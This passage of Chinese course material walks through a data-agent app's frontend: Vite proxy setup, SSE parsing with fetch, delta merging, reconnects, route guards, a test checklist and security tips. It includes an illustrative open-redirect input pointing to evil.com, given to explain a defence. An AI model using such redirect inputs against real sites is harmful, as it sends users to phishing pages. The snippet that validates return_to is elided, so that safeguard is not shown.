3. **路径别名 `@` → `./src`**。`tsconfig.app.json` 里也有对应的 `paths` 声明，两边必须一致（否则 TS 编译通过但运行时报错，或反过来）。

**端口定义在代码里而不是环境变量**：

```typescript
export const VITE_SERVER_PORT = 7001;
```

```typescript
    server: {
      port: VITE_SERVER_PORT,
```

**为什么端口硬编码**：因为它是前后端约定的（后端 7000、前端 7001），写死比配错更安全。

### 12.1.3 启动

```bash
npm --prefix web ci
npm --prefix web run dev
```

预期输出：

```
  VITE v7.x.x  ready in xxx ms

  ➜  Local:   http://localhost:7001/
  ➜  Network: use --host to expose
```

**验证代理生效**：

```bash
curl -s http://localhost:7001/api/v1/auth/me -i | head -5
```

预期返回 `401`（未带 token）——说明请求确实被代理到后端了（否则会返回 Vite 的 404 HTML）。

## 12.2 解析前端数据

### 12.2.1 SSE 消费：为什么不用 EventSource

浏览器原生的 `EventSource` API 有两个硬限制：

1. **不能自定义请求头**（所以不能带 `Authorization`）。
2. **只能 GET**（所以不能在请求体里传消息内容）。

项目里的替代方案是用 `fetch` + `ReadableStream` 手动解析 SSE：

```typescript
async function consumeChatStream(
  url: string,
  body: ChatStreamRequest | null,
  signal: AbortSignal,
  onEvent: (event: ChatStreamEvent) => void,
  method: "GET" | "POST" = "POST",
  retried = false
): Promise<void> {
  const accessToken = getAccessToken();
  if (!accessToken) throw new Error("登录状态已失效");

  const response = await fetch(url, {
    method,
    headers: {
      Accept: "text/event-stream",
      Authorization: `Bearer ${accessToken}`,
      "Content-Type": "application/json",
    },
    body: body === null ? undefined : JSON.stringify(body),
    signal,
  });
  if (response.status === 401 && !retried) {
    await refreshAccessToken();
    return consumeChatStream(url, body, signal, onEvent, method, true);
  }
  if (!response.ok) {
    throw new Error(await streamErrorMessage(response));
  }
```

**401 自动刷新并重试**。`retried` 标志防止无限循环——只重试一次。

**帧解析**：

```typescript
function parseStreamEvent(frame: string): ChatStreamEvent | null {
  const payload = frame
    .split("\n")
    .filter((line) => line.startsWith("data:"))
    .map((line) => line.slice(5).trimStart())
    .join("\n");
  return payload ? (JSON.parse(payload) as ChatStreamEvent) : null;
}
```

```typescript
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buffer = "";
  while (true) {
    const { done, value } = await reader.read();
    buffer += decoder.decode(value, { stream: !done }).replaceAll("\r\n", "\n");
    const frames = buffer.split("\n\n");
    buffer = frames.pop() ?? "";
    for (const frame of frames) {
      const event = parseStreamEvent(frame);
      if (event) {
        onEvent(event);
        if (event.type === "done") {
          await reader.cancel();
          return;
        }
      }
    }
    if (done) break;
  }
```

**四步处理**：

1. **`decoder.decode(value, { stream: true })`**。`stream: true` 表示「这可能是一个多字节字符的前半部分」。SSE 流里中文会被切在任意字节边界，不加这个参数会出现乱码。

2. **`replaceAll("\r\n", "\n")`**。SSE 规范允许 CRLF 和 LF 两种行尾。服务端用 `\n`，但中间代理可能改写成 `\r\n`。统一成 `\n` 才能正确切帧。

3. **`buffer.split("\n\n")` + `buffer = frames.pop()`**。SSE 用**空行**分隔帧。但一次 `read()` 可能拿到半个帧——所以最后一个元素（可能不完整）留在 buffer 里，等下次读取拼接。

4. **收到 `done` 主动 `reader.cancel()`**。服务端发完 `done` 后连接可能还开着（等心跳超时）。主动断开能立刻释放连接，也避免读到后续的心跳注释行。

**心跳注释行的处理**：`parseStreamEvent` 只提取 `data:` 开头的行。心跳帧是 `: keep-alive`，没有 `data:` 行，`payload` 是空字符串，返回 `null`——**被自然忽略**。

### 12.2.2 事件分发到状态

```typescript
      const onEvent = (event: ChatStreamEvent) => {
        if (!sessionLifecycle.isCurrent(generation)) return;
        if (event.type === "message") {
          appendMessage(conversationId, event.message);
        } else if (event.type === "thinking") {
          appendThinking(conversationId, event);
        } else if (event.type === "message_delta") {
          appendMessageDelta(conversationId, event);
        } else if (event.type === "subagent_message") {
          appendSubagentMessage(conversationId, event);
        } else if (event.type === "subagent_message_delta") {
          appendSubagentMessageDelta(conversationId, event);
        } else if (event.type === "subagent_thinking") {
          appendSubagentThinking(conversationId, event);
        } else if (event.type === "subagent_status") {
          updateSubagentStatus(conversationId, event);
        } else if (event.type === "error") {
          receivedError = true;
          toast.error(event.content);
        } else if (event.type === "done") {
          receivedDone = true;
        }
      };
```

**第一行 `if (!sessionLifecycle.isCurrent(generation)) return;` 是关键的防御**。

**问题场景**：用户登录 A 账号，发了一条消息（流开始）。在流还没结束时用户登出并登录 B 账号。此时 A 账号的流可能还在推事件——如果不过滤，A 的消息会被写进 B 的界面。

**解法**：`sessionLifecycle` 维护一个递增的 generation 计数。每次登录/登出/切换账号时递增。流开始时记下当时的 generation，每次事件到达时比对——不一致就丢弃。

### 12.2.3 增量合并：为什么需要 reset

```typescript
function appendThinkingDelta(
  messages: MessageResponse[],
  messageId: string,
  delta: string,
  reset: boolean | undefined
): MessageResponse[] {
  const index = messages.findIndex((message) => message.message_id === messageId);
  if (index < 0) {
    return [
      ...messages,
      {
        message_id: messageId,
        role: "assistant",
        finish_reason: "streaming",
        parts: [{ type: "thinking", text: delta, status: "streaming" }],
      },
    ];
  }

  const message = messages[index];
  const thinkingIndex = message.parts.findIndex((part) => part.type === "thinking");
  const parts = [...message.parts];
  if (thinkingIndex < 0) {
    parts.unshift({ type: "thinking", text: delta, status: "streaming" });
  } else {
    const thinking = parts[thinkingIndex];
    if (thinking.type !== "thinking") return messages;
    parts[thinkingIndex] = {
      ...thinking,
      text: reset ? delta : `${thinking.text}${delta}`,
      status: "streaming",
    };
  }
  const next = [...messages];
  next[index] = { ...message, finish_reason: "streaming", parts };
  return next;
}
```

**`reset ? delta : 已有文本 + delta`** —— 这是 `reset` 字段的唯一用途。

**为什么后端要发 `reset`**：模型对同一条消息可能分多次生成。第一次生成「我来分析一下」，中间调了工具，第二次继续生成「根据查询结果……」。第二次的第一个增量如果直接追加，会得到「我来分析一下根据查询结果」。但实际上第二次生成时模型可能重新组织了语言——这时应该替换而不是追加。

**后端的判断依据**（9.3.3 讲过）：`reset = message_id not in thinking_message_ids` —— 第一次见到这个 message_id 时为 `True`。

**思考结束的隐式标记**：

```typescript
  const parts = message.parts.map((part) =>
    part.type === "thinking" && part.status === "streaming"
      ? { ...part, status: "complete" as const }
      : part
  );
```

**收到正文增量时，把还在 streaming 的思考标记为 complete**。因为模型开始输出正文了，说明思考结束了。这样前端不需要一个单独的「思考结束」事件。

### 12.2.4 流结束的收口

```typescript
      .finally(async () => {
        if (streamControllersRef.current.get(conversationId) === controller) {
          if (sessionLifecycle.isCurrent(generation)) {
            const outcome =
              interruptedConversationsRef.current.has(conversationId) ||
              receivedError ||
              !receivedDone
                ? "interrupted"
                : "complete";
            interruptedConversationsRef.current.delete(conversationId);
            if (outcome === "interrupted") interruptRunningSubagents(conversationId);
            try {
              await syncMessages(conversationId);
            } catch (error) {
              toast.error(getApiErrorMessage(error, "同步最终消息失败"));
            }
            if (streamControllersRef.current.get(conversationId) === controller) {
              streamControllersRef.current.delete(conversationId);
              finishStreaming(conversationId, outcome);
              void loadConversations();
            }
          } else {
            streamControllersRef.current.delete(conversationId);
            interruptedConversationsRef.current.delete(conversationId);
          }
        }
      });
```

**三步收口**：

1. **判定 outcome**。三种情况算「中断」：用户主动停止、收到 error 事件、**没收到 done 事件**。最后一条能捕获「网络断了」这种情况。

2. **`syncMessages(conversationId)` 用服务端快照覆盖本地**。这是「乐观更新 + 权威同步」模式的收尾——本地增量可能有偏差（丢帧、乱序），服务端 `GET /ls/{id}` 返回的才是真相。

3. **`finishStreaming`** 清除 streaming 标记，把还在 streaming 的思考定稿为 `complete` 或 `interrupted`。

**两次 `streamControllersRef.current.get(conversationId) === controller` 检查**。第二次是因为 `await syncMessages` 是异步的——这期间可能已经有新的流开始了（用户又发了消息）。如果 controller 已经不是自己了，**不能清理**（否则会把新流的 controller 删掉）。

**这个「异步操作前后都检查身份」的模式在并发代码里非常重要**，项目里多处使用。

### 12.2.5 断线重连

```typescript
      const stream = (async () => {
        let nextMode = mode;
        while (!controller.signal.aborted && !receivedDone) {
          let connectionError: unknown = null;
          try {
            if (nextMode.type === "start") {
              await chatApi.streamChat(
                conversationId,
                nextMode.message,
                controller.signal,
                onEvent
              );
            } else if (nextMode.type === "resume") {
              await chatApi.resumeChat(conversationId, controller.signal, onEvent);
            } else {
              await chatApi.subscribeRun(conversationId, controller.signal, onEvent);
            }
          } catch (error) {
            if (error instanceof DOMException && error.name === "AbortError") return;
            connectionError = error;
          }

          if (controller.signal.aborted || receivedDone) return;
          const status = await chatApi.getRunStatus(conversationId);
          if (!status.data.running) {
            if (connectionError) throw connectionError;
            return;
          }
          nextMode = { type: "subscribe" };
        }
      })();
```

**重连策略**：

1. 流意外结束（没收到 `done`）时，**先查后端「还在跑吗」**（`GET /{id}/run`）。
2. **还在跑** → 用 `subscribe` 模式重连（`GET /{id}/events`），能拿到 replay 的历史事件。
3. **不跑了** → 如果之前有连接错误就抛出去（让用户看到错误），否则正常结束。

**`nextMode` 从 `start` 变成 `subscribe`** —— 重连时不再发消息（消息已经发过了），只是订阅。这是后端「Run 与订阅解耦」设计带来的能力。

**AbortError 特殊处理**：用户主动取消时抛的是 `AbortError`，这时直接 `return`，不重连。

### 12.2.6 页面重进后的自动恢复

```typescript
  useEffect(() => {
    if (!routeConversationId || streamControllersRef.current.has(routeConversationId)) return;
    let active = true;
    void chatApi
      .getRunStatus(routeConversationId)
      .then((response) => {
        if (
          !active ||
          !response.data.running ||
          streamControllersRef.current.has(routeConversationId)
        ) {
          return;
        }
        markStreaming(routeConversationId);
        runStream(routeConversationId, { type: "subscribe" });
      })
```

**用户刷新页面后自动恢复**：查一下这个会话有没有在跑，有就自动订阅。

**`let active = true` + 清理函数**（`return () => { active = false; }`）是 React 里处理「异步操作完成时组件可能已卸载」的标准模式。

## 12.3 访问前端页面

### 12.3.1 登录

打开 <http://localhost:7001>，未登录会重定向到 `/login?return_to=...`。

**`return_to` 的安全处理**：

```typescript
      const returnTo = `${location.pathname}${location.search}`;
      return (
        <Navigate to={`${ROUTES.login}?${new URLSearchParams({ return_to: returnTo })}`} replace />
      );
```

登录页要校验它：

```typescript
    const safeReturnTo = ...
```

**只允许站内相对路径**。这是防「开放重定向」——如果 `return_to` 可以是任意 URL，攻击者构造 `/login?return_to=https://evil.com` 就能在用户登录后把他导到钓鱼站。

### 12.3.2 路由守卫

```typescript
    useEffect(() => {
      if (isLoading) {
        void checkAuth();
      }
    }, [isLoading]);

    if (isLoading) {
      return <PageLoadingScreen message="正在验证登录状态..." />;
    }

    if (!isAuthenticated) {
      const returnTo = `${location.pathname}${location.search}`;
      return (
        <Navigate to={`${ROUTES.login}?${new URLSearchParams({ return_to: returnTo })}`} replace />
      );
    }

    if (requireAdmin && !isAdmin()) {
      toast.error("无权限访问此页面");
      return <Navigate to={ROUTES.chat} replace />;
    }
```

**三种状态**：

| 状态 | 表现 |
| --- | --- |
| 校验中（`isLoading`） | 全屏加载页 |
| 未登录 | 重定向到登录页，带 `return_to` |
| 已登录但非管理员访问 `/admin` | toast 提示后回 `/chat` |

**`isLoading` 初始是 `true`**（`auth/store.ts`），所以首次进入一定会走一次 `checkAuth`。

### 12.3.3 聊天页的布局

```
┌──────────────┬──────────────────────────────────────────┐
│ ChatSidebar  │  ChatMessages                            │
│              │   ├─ 用户消息（附件在上）                │
│  会话列表     │   ├─ 执行过程折叠区                      │
│  ├─ 会话 1    │   │   ├─ 思考过程                        │
│  ├─ 会话 2    │   │   ├─ 工具调用条                      │
│  └─ ...       │   │   └─ 子 Agent 委派卡片               │
│              │   └─ 最终答案（Markdown 渲染）            │
│              │                                          │
│ ChatUserFooter│  ChatComposer（输入框 + 附件 + 发送/停止）│
└──────────────┴──────────────────────────────────────────┘
```

**显示模型是纯函数管线**（`displayModel.ts`）：

```
messages（扁平的 part 数组）
  → buildDisplayItems      把 part 拆成 message / tool_run 条目
  → groupDisplayItemsIntoTurns   按用户消息切分成「轮次」
  → splitFinalAssistantMessage   把每轮的最终答案从中间过程里分出来
```

**为什么要这样分层**：后端的 `MessageResponse.parts` 是一个扁平数组（text / thinking / tool_call / tool_result 混在一起）。UI 需要的是「轮次 + 工具条 + 最终答案」的树形结构。三个纯函数各做一层转换，每层都能单独测。

**代价**：每次渲染都要重算（没有 memo）。长会话（几百条消息）会有性能压力。

### 12.3.4 端到端验证清单

按顺序做一遍，确认全链路通：

| 步骤 | 操作 | 预期 |
| --- | --- | --- |
| 1 | 用管理员登录 | 进入 `/chat`，左侧显示空会话列表 |
| 2 | 点「新建对话」 | URL 变成 `/chat/<uuid>`，输入框可输入 |
| 3 | 输入「你好」并回车 | 立即显示用户消息；助手开始流式回复 |
| 4 | 观察流式效果 | 思考过程先出现，然后正文逐字出现 |
| 5 | 输入取数问题（如「最近30天GMV」） | 出现工具调用条和子 Agent 卡片 |
| 6 | 任务跑到一半刷新页面 | 自动恢复订阅，继续显示进度 |
| 7 | 点「停止」 | 流停止，出现「继续」按钮 |
| 8 | 点「继续」 | 从中断处继续执行 |
| 9 | 问一个要求交付文件的问题 | 回答下方出现附件卡片，可下载 |
| 10 | 点附件卡片预览 | 打开预览（HTML 会做 XSS 消毒后渲染） |
| 11 | 左侧点另一个会话 | 切换到该会话的消息 |
| 12 | 重命名会话 | 标题更新，刷新后仍生效 |
| 13 | 删除会话 | 从列表消失 |
| 14 | 左下角点「后台」 | 进入管理中心 |
| 15 | 切到「元数据管理」 | 显示表和字段列表 |
| 16 | 切到「Doris 角色管理」 | 显示角色列表，可新建角色 |
| 17 | 切到「用户账号管理」 | 显示用户列表，可新建用户 |
| 18 | 切到「查询经验管理」 | 显示沉淀的 SQL 经验 |
| 19 | 用普通用户登录（非管理员） | 看不到「后台」按钮；直接访问 `/admin` 被弹回 |
| 20 | 登出 | 回到登录页；token 从 localStorage 清除 |

### 12.3.5 常见联调问题

| 现象 | 原因 | 排查 |
| --- | --- | --- |
| 页面能打开但接口全 404 | Vite 代理没生效 | 检查 `web/.env` 的 `VITE_APP_PROXY`；重启 dev server（改 `.env` 需要重启） |
| 接口 401 但 token 有值 | token 过期且刷新失败 | 看 Network 里 `/auth/refresh` 的响应 |
| SSE 不流式（一次性出结果） | 中间代理在缓冲 | 检查响应头有没有 `X-Accel-Buffering: no`；Nginx 还要关 `proxy_buffering` |
| SSE 收到乱码 | 解码没带 `stream: true` | 检查 `decoder.decode(value, { stream: true })` |
| 思考内容不显示 | `reset` 处理有问题 | 看 EventStream 里每个 delta 的 `reset` 值 |
| 刷新页面后进度丢失 | 订阅恢复没生效 | 看 Network 里有没有 `GET /{id}/run` 和 `GET /{id}/events` |
| 附件卡片不出现 | 产物指令没被识别 | 看 `GET /ls/{id}` 响应里有没有 `attachments`；检查正文里是否还有 `[[DATAAGENT_ARTIFACT:...]]` |
| 中文图表显示方块 | 沙箱缺中文字体 | `docker run --rm dataagent-sandbox:latest /bin/sh -lc "fc-match 'WenQuanYi Zen Hei'"` |

---

## 附：这份课件覆盖了什么、没覆盖什么

**完整覆盖**（可以照着写一遍）：

- `shared/`：配置、四类客户端、Checkpoint 与 advisory lock、Celery、错误、日志、应用装配
- `identity/`：密码、JWT、限流、Doris 角色与权限投影、查询身份、注销受理
- `metadata/`：ORM 模型、YAML 导入、语义索引同步、取值索引状态机、多路召回、召回快照
- `query/`：guard 全部校验规则、流式执行、CSV 安全、经验沉淀与召回
- `sandbox/`：路径模型、容器规格、卷管理、跨进程协调、命令包装、UID 隔离
- `assistant/`：会话与回合、Run 与订阅、事件投影、Planner 与 Specialist 构造、委派、中间件、Checkpoint 投影、消息投影
- `workflows/`：用户注销编排
- API 层：依赖注入三种生命周期、路由组织、错误翻译
- 前端：SSE 消费、增量合并、断线重连、路由守卫

**部分覆盖**（只讲了定位和关键点，没逐行展开）：

| 文件 | 行数 | 为什么没展开 |
| --- | --- | --- |
| `app/sandbox/archive.py` | 785 | UID 注册表与目录树的完整实现，机制已在 8.3.10 讲清，细节偏运维 |
| `app/assistant/agents/shell_jobs.py` | 535 | Shell Job 状态机完整实现，核心机制已在 8.3.11 讲清 |
| `app/assistant/agents/middleware/user_message_context.py` | 515 | 只讲了数据模型和投影思路，附件注入的完整流程未展开 |
| `app/identity/services/rate_limit.py` | 302 | 讲了规则和 Redis Lua 思路，Lua 脚本本体未逐行讲 |
| `app/query/repositories/experience_postgres.py` | 447 | 讲了 upsert 和索引版本，其余查询未展开 |
| `app/metadata/repositories/postgres.py` | 623 | 讲了 advisory lock 和版本提交，其余 CRUD 未展开 |
| `app/identity/repositories/doris_role.py` | 450 | 讲了标识符引用和 drop 状态，其余 Doris 命令未展开 |
| `dbmock/` 整个子项目 | — | 数据生成器，与主链路解耦，只讲了怎么跑 |
| `web/src/pages/Admin/**` | ~5000 | 管理中心各功能块的组件实现，只列了目录结构 |
| `web/src/pages/Chat/components/messages/**` | ~2000 | 消息渲染组件群，只讲了显示模型管线 |

**没有覆盖**：

- **没有单元测试**。仓库里 `pyproject.toml` 声明了 `testpaths = ["tests"]`，但没有 `tests/` 目录。每章的「测试」小节给的都是端到端验证方法。
- **没有部署与运维**。多实例部署、Docker Compose 之外的编排、监控告警都不在本课件范围。
- **没有性能数据**。课件里没有实测的 QPS、延迟、资源占用数据，因为仓库里没有基准测试。

## 附：安全提示

项目里有几处需要提醒：

1. **`conf/.env` 绝不能进版本库**。`.gitignore` 已经包含了 `.env`，但如果你是手工复制项目，注意别把填好密钥的 `.env` 带过去。

2. **默认配置下用户存储没有硬配额**。`conf/app_config.yaml` 里：

   ```yaml
     volume_driver: local # 用户持久化数据卷使用的 Docker Volume Driver。
     volume_driver_options: {} # local 驱动不支持硬配额；生产驱动应使用 {max_user_storage_bytes}。
   ```

   单文件限制（52MB）是有的，但用户可以传很多文件。**生产部署必须换成支持配额的卷驱动**，并在 `volume_driver_options` 里带 `{max_user_storage_bytes}` 占位符（配置模型会强制校验这一点）。

3. **`scripts/init_db.py` 和 `dbmock/scripts/init_db.py` 都是破坏性的**（先 `DROP DATABASE` 再 `CREATE`）。前者清 `auth` / `meta` / `langgraph`，后者清 `ecommerce`。**只能指向本地可重建的数据**。

4. **沙箱默认断网是安全设计，不是 bug**。`network_mode: none` 意味着模型生成的代码不能下载任何东西。如果需要新增依赖，改 `docker/sandbox/requirements.txt` 或 `package.json` 后重建镜像：

   ```bash
   docker compose -f docker/compose.yml build sandbox-image
   ```

5. **`X-Forwarded-For` 不可信**。追踪中间件会用它写日志，但限流用的是 `request.client.host`（ASGI 层真实地址）。如果部署在反向代理后面，限流会把所有请求算作同一个 IP——这时需要在代理层配 `proxy_set_header` 并改 `get_client_ip` 的实现（但要注意信任边界）。

6. **行策略谓词只做了「单语句」校验**。`_validate_predicate` 用 sqlglot 确认它是单条语句，但没有进一步检查「必须是布尔表达式」。这个谓词会被拼进 Doris 的 `CREATE ROW POLICY` 语句。如果要加固，可以检查 AST 根节点是否是比较或逻辑节点。
